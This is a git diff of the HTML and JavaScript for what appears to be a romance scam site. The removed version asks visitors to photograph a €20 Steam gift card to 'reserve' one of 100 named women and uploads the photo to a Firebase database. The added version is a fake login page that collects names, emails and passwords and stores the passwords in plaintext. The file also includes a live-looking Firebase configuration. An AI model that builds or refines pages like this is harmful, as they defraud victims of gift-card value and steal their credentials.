@@ -1,59 +1,103 @@
-   <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Validation de Réservation</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Connexion</title>
 
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
-  <style>
-    body { margin: 0; font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #1c1e21; }
-    .scan-container { max-width: 420px; margin: 30px auto; background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.15); }
-    
-    .chat-img { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #28a745; margin-bottom: 15px; }
-    h2 { color: #d32f2f; margin-bottom: 10px; font-size: 24px; }
-    #chatDesc { font-size: 14px; line-height: 1.5; color: #555; margin-bottom: 20px; }
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI", Arial, sans-serif;}
 
-    #preview { display: none; width: 100%; border-radius: 12px; margin-top: 15px; border: 2px solid #007bff; max-height: 250px; object-fit: contain; }
-    
-    .btn { width: 100%; padding: 15px; margin-top: 15px; font-size: 16px; border-radius: 12px; border: none; color: white; cursor: pointer; font-weight: bold; transition: 0.3s; }
-    .scanner-btn { background: #28a745; }
-    .scanner-btn:hover { background: #218838; }
-    .validate-btn { background: #007bff; display: none; }
-    .validate-btn:hover { background: #0069d9; }
-    .validate-btn:disabled { background: #ccc; cursor: not-allowed; }
+/* STABILISATION DE LA PAGE ET ANTI-ZOOM */
+html, body {
+  height: 100vh;
+  overflow: hidden; /* Empêche le scroll parasite de la page entière */
+  touch-action: pan-y; /* Désactive le zoom par double-tap */
+  -webkit-text-size-adjust: 100%;
+}
 
-    .loading-text { display: none; margin-top: 20px; font-size: 15px; }
-    .success-msg { color: #28a745; font-weight: bold; animation: pop 0.4s ease-out; }
-    @keyframes pop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-  </style>
+body{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(135deg,Gold,white,black,DarkGray,NavajoWhite,Deeppink,tan,RoyalBlue,black,tomato);
+}
+
+.login-container{
+  background:tan;
+  width:100%;
+  max-width:420px;
+  padding:35px 30px;
+  border-radius:25px;
+  box-shadow:0 20px 40px rgba(0,0,0,0.25);
+  text-align:center;
+  animation:fadeIn 0.6s ease;
+  margin: 10px;
+}
+
+@keyframes fadeIn{from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);}}
+
+.login-container h2{font-size:28px;color:red;margin-bottom:8px;}
+.login-container p{color:Black;font-size:14px;margin-bottom:25px;}
+
+/* TAILLE 16PX MINIMUM POUR EVITER ZOOM AUTO IPHONE */
+.login-container input{
+  width:100%;
+  padding:15px 18px;
+  margin-bottom:18px;
+  border-radius:14px;
+  border:1px solid black;
+  font-size:16px !important; /* Force 16px pour la stabilité mobile */
+  outline:none;
+  transition:0.3s;
+  background-color: #fff;
+}
+
+.login-container input:focus{border-color:blue;box-shadow:0 0 0 3px rgba(79,172,254,0.2);}
+
+.login-container button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:16px;
+  background:linear-gradient(135deg,green,yellow,red);
+  color:black;
+  font-size:18px;
+  font-weight:600;
+  cursor:pointer;
+  transition:0.3s;
+  -webkit-tap-highlight-color: transparent;
+}
+
+.login-container button:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(0,0,0,0.2);}
+.login-container button:active{transform:scale(0.98);}
+
+.footer-text{margin-top:18px;font-size:13px;color:purple;}
+</style>
 </head>
 
 <body>
 
-  <div class="scan-container">
-    <img id="chatImage" src="" alt="Profil" class="chat-img">
-    <h2 id="chatName">Chargement'.".".'</h2>
-    <p id="chatDesc">🫠😘🫦👅 B4re continue mak sure 2 scan 1 steam pic's contain €20 4r reservation instead i'll 9ver reply u my kinky 🥵🥵</p>
+<div class="login-container">
+  <h2>CONNEXION</h2>
+  <p>b4r u enter ur full informations u've been must keept on awarness that,u're ought 2 cramed its as ur next connexion, otherwise u'll lose ur access's msnger </p>
+  <p>Acess ur pvt msnger by enter unforgetable identifiers</p>
 
-    <button id="scanBtn" class="btn scanner-btn">📷 SCANN A PHOTO</button>
-    <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none;">
-    
-    <img id="preview" src="" alt="Aperçu du scan">
-    
-    <button id="validateBtn" class="btn validate-btn">VALIDATE & CONNECT</button>
-    
-    <div id="loading" class="loading-text">
-        <span id="loadStatus">sent to secured server...</span>
-    </div>
-  </div>
+  <form id="loginForm">
+    <input type="text" id="nom" placeholder="1st/2nd name" required>
+    <input type="email" id="email" placeholder=" email Adress" required>
+    <input type="password" id="password" placeholder="password(do not forget it)" required>
+    <button type="submit" id="submitBtn">CONNECT</button>
+  </form>
+
+  <div class="footer-text">ur informations are secured !</div>
+</div>
 
 <script>
-  
-// ==== CONFIGURATION FIREBASE ====
-
+// Tes données Firebase et ta logique de redirection restent strictement identiques
 const firebaseConfig = {
   apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
   authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
@@ -65,96 +109,62 @@ const firebaseConfig = {
   databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
 };
 
-// Initialisation
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// Récupération Paramètres URL
+const imgNumChoisi = localStorage.getItem('selectedImgId');
+const nomProfil = localStorage.getItem('selectedProfile');
 
-const params = new URLSearchParams(window.location.search);
-const imgNum = params.get("img");
-const email = params.get("email");
+const loginForm = document.getElementById("loginForm");
+const submitBtn = document.getElementById("submitBtn");
 
-if (!imgNum || !email) {
-    window.location.href = "index.html";
-}
+loginForm.addEventListener("submit", function(e){
+  e.preventDefault();
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Checking...";
 
-const profils = { 1: "Alessia", 2: "Alice", 3: "Angela", 4: "Arianna", 5: "Aurora", 6: "Beatrice", 7: "Benedetta", 8: "Bianca", 9: "Camilla", 10: "Carla", 11: "Carlotta", 12: "Caterina", 13: "Chiara", 14: "Claudia", 15: "Cristina", 16: "Daniela", 17: "Deborah", 18: "Denise", 19: "Diana", 20: "Elena", 21: "Eleonora", 22: "Elisa", 23: "Elisabetta", 24: "Emma", 25: "Federica", 26: "Francesca", 27: "Gabriella", 28: "Gaia", 29: "Giada", 30: "Giulia", 31: "Giorgia", 32: "Ilaria", 33: "Isabella", 34: "Laura", 35: "Lavinia", 36: "Lea", 37: "Letizia", 38: "Lidia", 39: "Lorenza", 40: "Lucia", 41: "Lucrezia", 42: "Ludovica", 43: "Manuela", 44: "Mara", 45: "Margherita", 46: "Maria", 47: "Marianna", 48: "Martina", 49: "Matilde", 50: "Michela", 51: "Miriam", 52: "Monica", 53: "Nadia", 54: "Nicole", 55: "Nicoletta", 56: "Noemi", 57: "Paola", 58: "Patrizia", 59: "Rebecca", 60: "Roberta", 61: "Rosa", 62: "Rosalia", 63: "Sabrina", 64: "Samantha", 65: "Sara", 66: "Serena", 67: "Silvia", 68: "Simona", 69: "Sofia", 70: "Sonia", 71: "Stefania", 72: "Stella", 73: "Susanna", 74: "Teresa", 75: "Valentina", 76: "Valeria", 77: "Vanessa", 78: "Veronica", 79: "Viola", 80: "Virginia", 81: "Viviana", 82: "Agata", 83: "Anita", 84: "Antonella", 85: "Asia", 86: "Bruna", 87: "Carmen", 88: "Carina", 89: "Cinzia", 90: "Costanza", 91: "Dafne", 92: "Emanuela", 93: "Fiorella", 94: "Gabriela", 95: "Gemma", 96: "Iolanda", 97: "Lara", 98: "Melissa", 99: "Rosanna", 100: "Stefania" };
-
-document.getElementById("chatImage").src = `IMAGE/img${imgNum}.jpg`;
-document.getElementById("chatName").textContent = profils[imgNum] || "Ma Chérie";
-
-// Gestion de la caméra
-
-const scanBtn = document.getElementById("scanBtn");
-const cameraInput = document.getElementById("cameraInput");
-const preview = document.getElementById("preview");
-const validateBtn = document.getElementById("validateBtn");
-const loading = document.getElementById("loading");
-const loadStatus = document.getElementById("loadStatus");
-
-scanBtn.onclick = () => cameraInput.click();
-
-cameraInput.onchange = () => {
-  const file = cameraInput.files[0];
-  if (!file) return;
-  const reader = new FileReader();
-  reader.onload = e => {
-    preview.src = e.target.result;
-    preview.style.display = "block";
-    validateBtn.style.display = "block";
-    scanBtn.style.display = "none";
-  };
-  reader.readAsDataURL(file);
-};
-
-// Envoi et Succès ✅
-
-validateBtn.onclick = async () => {
-  validateBtn.disabled = true;
-  loading.style.display = "block";
-  
+  const nom = document.getElementById("nom").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
   const userKey = email.replace(/\./g, '_');
-  const convKey = imgNum + "_" + userKey;
-  const secretKey = btoa(email + "_KEY_" + imgNum).slice(0,16);
 
-  // Cryptage de la photo pour page 3
-  const encryptedPhoto = btoa(unescape(encodeURIComponent(secretKey + "::" + preview.src)));
+  db.ref("registered_users/" + userKey).once("value").then((snapshot) => {
+    const userData = snapshot.val();
 
-  try {
-    //  Branche Scans
-    await db.ref("scans/" + userKey).set({
-      scanPhoto: preview.src,
-      userEmail: email,
-      profilId: imgNum,
-      date: new Date().toLocaleString()
-    });
+    if(userData) {
+      if(userData.password !== password) {
+        alert("Incorrect password!");
+        submitBtn.disabled = false;
+        submitBtn.innerText = "CONNECT";
+        return;
+      }
+    } else {
+      db.ref("registered_users/" + userKey).set({
+        nom: nom,
+        email: email,
+        password: password,
+        dateJoined: new Date().toLocaleString()
+      });
+    }
 
-    //  Branche Messages (Premier message)
-    
-    await db.ref("messages/" + convKey).push({
-      from: "user",
-      message: encryptedPhoto,
-      date: new Date().toLocaleString()
-    });
+    localStorage.setItem("currentUserEmail", email);
+    localStorage.setItem("currentUserName", nom);
 
-    // Animation de succès 
-    
-    loadStatus.innerHTML = "<span class='success-msg'>🌀 SUCCED TRANSFER!</span><br>Connexion to the chat.....";
-    localStorage.setItem('scanned_' + userKey + '_' + imgNum, "true");
+    const hasScannedBefore = localStorage.getItem('scanned_' + userKey + '_' + imgNumChoisi);
 
-    // Redirection après 2 secondes
-    
-    setTimeout(() => {
-      window.location.href = `page3.html?img=${imgNum}&email=${encodeURIComponent(email)}`;
-    }, 2000);
+    if(hasScannedBefore === "true") {
+      window.location.href = `page3.html?img=${imgNumChoisi}&email=${encodeURIComponent(email)}`;
+    } else {
+      window.location.href = `page2.html?img=${imgNumChoisi}&email=${encodeURIComponent(email)}`;
+    }
 
-  } catch (e) {
-    alert("Erreur de connexion. Réessayez.");
-    validateBtn.disabled = false;
-    loading.style.display = "none";
-  }
-};
+  }).catch((error) => {
+    console.error(error);
+    alert("Connection error. Check your database status.");
+    submitBtn.disabled = false;
+    submitBtn.innerText = "CONNECT";
+  });
+});
 </script>
 
 </body>
